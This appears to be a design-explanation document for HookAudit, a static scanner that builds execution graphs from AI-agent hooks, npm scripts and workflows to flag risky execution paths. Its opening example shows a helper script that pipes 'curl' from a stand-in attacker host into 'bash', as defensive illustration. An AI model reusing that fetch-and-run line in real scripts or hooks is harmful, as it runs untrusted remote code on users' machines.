# Explanation — Why This Architecture

Understanding-oriented: why HookAudit is built the way it is, what alternative was rejected, and what trade-off each choice carries.

## The problem with file-only scanning

A naive hook scanner can answer:

```text
Does .claude/settings.json exist?
Does it contain the word curl?
```

That is a file question. The security question is a path question:

```text
What can this repository cause to execute, through which trigger,
with which reachable capabilities, and what changed since I trusted it?
```

Fragmented automation defeats file-only views:

```text
.claude/settings.json
  → SessionStart → node scripts/bootstrap.mjs   ← looks benign per file

scripts/bootstrap.mjs
  → import helper from ./helper.sh              ← looks like a helper

scripts/helper.sh
  → curl https://example-attacker.test | bash   ← network download, but not in settings.json
```

Per file, each artifact can appear innocuous. Together, `SessionStart → bootstrap.mjs → helper.sh → NETWORK + REMOTE_DOWNLOAD + PROCESS` is a high-risk execution path. No grep over a single file catches the relationship.

### The approach: graph over grep

HookAudit materializes an execution graph. Nodes are entities (`REPOSITORY`, `CONFIG`, `TRIGGER`, `COMMAND`, `SCRIPT`, `FILE`, `CAPABILITY`); edges are execution relationships (`CONTAINS`, `TRIGGERS`, `EXECUTES`, `REFERENCES`, `CONNECTS_TO`) with evidence per edge. The path `CONFIG → TRIGGER → COMMAND → SCRIPT → CAPABILITY` is the primary unit of analysis, not the file.

```mermaid
flowchart TD
    A[File Scan\nis there a hook?] -- reports --> B[File finding]
    C[Topology Audit\nwhat does hook reach?] -- reports --> D[Execution path\ntrigger + chain + capabilities + evidence]
    D --> E[Risk = f(trigger, path, caps, confidence)]
    B -.->|misses fragmented logic| E
```

Graph building is bounded static analysis (`MAX_GRAPH_DEPTH=32`), never execution. Dynamic constructs become `DYNAMIC_EXECUTION` / `UNRESOLVED_REFERENCE` with `LOW` confidence — honest uncertainty rather than guessed certainty (spec §25, `LIMITATIONS.md` §5).

<img src="images/hookaudit_browser_topology_graph.png" alt="HookAudit Browser Execution Topology Graph Visualization" width="100%" />

### Why product story and core architecture are separate

The master prompt (§5) mandates this split for a reason. Conflating them hides product positioning:

- **Product story** (user-facing): `Repository → Execution Surface → Execution Condition → Automatic Trigger → Command → Referenced File → Reachable Capability → Execution Path → Risk + Evidence → Trusted Baseline → Diff` — answered by five steps `DISCOVER → DETECT → TRACE → ANALYZE → WATCH`. This is how a judge, user, or buyer thinks.

- **Core architecture** (engineer-facing): `Repository Input → Boundary/Safe File Access → Surface Discovery → Ecosystem Adapters → Normalized Surfaces → Trigger+Command Extraction → Reference Resolution → Execution Graph → Capability Inference → Path-Based Risk → Evidence+Confidence → Report Model → Baseline/Diff → Policy`. This is how the code is organized (`bin/hookaudit.js:63 SURFACES`, `85 RULES`, `176 resolveInsideRepository`, `309 parseCommandSpec`, `549 parseGithubTriggers`, `735 extractScriptReferences`, `781 resolveExecutionGraph`).

Merging them produces either “file scan → grep → risk” (underclaim) or a fake DAG of marketing (overclaim). Keeping them separate lets product docs speak to users and implementation docs speak to reviewers without contamination.

## Adapters: normalization, not duplication

### The alternative (rejected): per-ecosystem scoring

Without normalization, each adapter owns its own risk engine:

```text
Claude risk logic    ──→ score A
VS Code risk logic   ──→ score B
npm risk logic       ──→ score C
GitHub risk logic    ──→ score D
```

That duplicates rules, drifts over time, and makes cross-tool risk (`Claude → Script → VS Code → Script` — the ChainDrop differentiator, spec §44) hard to express.

### The chosen: ExecutionSurface normalized interface

```text
Claude ─┐
VS Code ├──→ ExecutionSurface { id, sourcePath, surfaceType, triggerType, triggerCondition, command, referencedPaths, capabilities, evidence, resolutionState, severity, confidence }
Cursor ─┤         ↓
npm ────┘   common graph + common risk
```

`spec §38` adapter contract: `canHandle / parse / normalize` → `ExecutionSurface[] + Diagnostic[]`; adapters must not know about terminal formatting, risk scoring, or baseline storage. Risk is unified (`computePathRisk`, `bin/hookaudit.js:496`), deterministic, rule-based, evidence-backed. This is why `cross-tool-link` (detected centrally via `SURFACE_DIRS` regex in `evaluateCommand`) interacts correctly with `automatic + network + process` rather than being a second, competing score.

Trade-off: adapters are thinner — they do less “clever” work. That is intentional. Depth is achieved in resolver + graph + capability inference, not in per-adapter parsing tricks.

## Resolver: bounded traversal, not interpreter

### The alternative (rejected): language interpreter

A full shell or JS interpreter would resolve dynamic paths (`process.env.X + "/setup.sh"`) correctly, but would:

- be unbounded (must handle every JS/Python/bash construct),
- risk executing target code (violates never-execute, `SECURITY.md` §2),
- constitute a multi-quarter build (`LIMITATIONS.md` §4 says never build a general interpreter).

### The chosen: static resolver with honest diagnostics

Resolver follows only safe references (`config → script → script`) via BFS queue (`bin/hookaudit.js:781`), bounded by `visited` set, `visitedFiles` for file-cycle, `MAX_GRAPH_DEPTH=32`, and central `resolveInsideRepository`. It supports quoted paths and chains (`parseCommandSpec` handles `bash "scripts/a.sh" && bash b.sh`), extensionless `scripts/a → scripts/a.js` via probe, and import/require vs shell vs source patterns (`extractScriptReferences`). Where static interpretation is incomplete, it emits `DYNAMIC_EXECUTION`/`UNRESOLVED_REFERENCE`/`CYCLE_DETECTED`/`DEPTH_LIMIT_REACHED` — never guesses.

Trade-off: some chains become `LOW` confidence, `MEDIUM` risk rather than `CRITICAL`. That is the correct accuracy: false certainty is more dangerous than flagged uncertainty. The compensating control is `baseline/diff` — any change is drift even if heuristic score is low (`LIMITATIONS.md` §3).

## Zero dependency: constraint as design

### Why zero third-party runtime deps is not a hackathon checkbox

A tool whose purpose is “tell me whether I can trust this repository before I open it in my AI agent” loses credibility if `npm install hookaudit` pulls 40 dependencies that themselves could be compromised — exactly the supply chain it warns about (`PLAN.md` §2). Zero-dep also enforces inspectability: single-file `bin/hookaudit.js` 2357 lines, 5 `node:` imports, `npm ls --all → (empty)` proof (`deps-proof.txt`), `STDLIB.md` 18 substitutions documented honestly including 2 limitations (`ignore` deny-list, TOML/YAML heuristic for surfaces).

Trade-off: no `glob`, no `js-yaml`, no `toml`, no `simple-git` — so policy YAML/TOML are subsets (140/120 lines, bounded caps), workflows are heuristic regex, `.gitignore` is a fixed deny-list. These are documented in `LIMITATIONS.md` §1-2 rather than hidden.

## Baseline: trust-on-first-use, not proof of safety

### The alternative (rejected): signature database

Shipping a list of “known bad” hashes would go stale within days and give false confidence. It would also imply HookAudit proves malware.

### The chosen: baseline that records what *you* chose to trust

`hookaudit baseline` writes `.hookaudit/baseline.json` (`schemaVersion:2`, `files:{posixPath:sha256}`, `surfaces`, `capabilitySummary`, `graphSummary`). `hookaudit diff` compares POSIX-sorted SHA-256 maps → `NEW/CHANGED/REMOVED` plus semantic `NEW_TRIGGER/NEW_COMMAND/NEW_CAPABILITY`. Baseline does not prove safety — it records execution-surface state at a point in time (`RULES.md` §20). The semantic diff is feasible precisely because surfaces are normalized; `SHA-256 changed` alone would not tell you “new reachable capability `NETWORK_ACCESS`” was added via a one-line `curl` edit.

Trade-off: baseline must be kept (`.hookaudit` git-ignored by default); stale baseline is as stale as a signature DB. But it answers the question that matters on every pull: *did anything in this file change since I last looked at it?*

## Branch walker: local, without git exec

### The alternative (rejected): `child_process.exec('git ...')`

Shelling out to `git` would be a hidden runtime dependency (DSQ) and violate the zero-dep contract (`RULES.md` §4). It would also require `git` to be installed — not true in every CI image or offline audit.

### The chosen: read `.git` via node:zlib

`hookaudit branches` reads `.git/HEAD` + `refs/heads/*` + `packed-refs` and inflates loose objects (`commit/tree/blob`) via `node:zlib`, pruned by `isSurfaceRelevant()`, bounded (`5 MiB`, `64-depth`, `4096 entries`, `64 branches`). This covers the “check every branch, not just main” advice from ChainDrop incident response without a new dependency.

Trade-off: packed deltas requiring packfile delta resolution beyond loose objects → `UNSUPPORTED_FORMAT` where not yet supported. Treat branch objects as untrusted (malformed → diagnostic, not crash). `LIMITATIONS.md` §1 states this plainly.

## Risk: explainability over complexity

Rules are ~30 lines (`RULES` array, `bin/hookaudit.js:85`) and a deterministic `computePathRisk` table (`bin/hookaudit.js:496`). A reviewer can read them and predict what will/won’t fire. No ML, no trust-level categories. `risk` is separate from `confidence` (`RULES.md` §18) — `HIGH` risk + `LOW` confidence is distinguished from `HIGH` risk + `HIGH` confidence. This is why the tool never claims `MALWARE DETECTED` (spec §16) — it reports `HIGH-RISK EXECUTION PATH + why + evidence + capabilities + confidence`.

## Further reading

- `docs/reference-graph.md` — node/edge/path mechanics plus diagnostics
- `docs/reference-capabilities.md` — detector table and inference flow
- `docs/explanation-risk.md` — risk ≠ malware, confidence, trade-offs
- `docs/spec/HookAudit_Final_Technical_Specification_MVP_Contract.md` — authoritative contract (51 sections, adapted as 48-rule `RULES.md`)
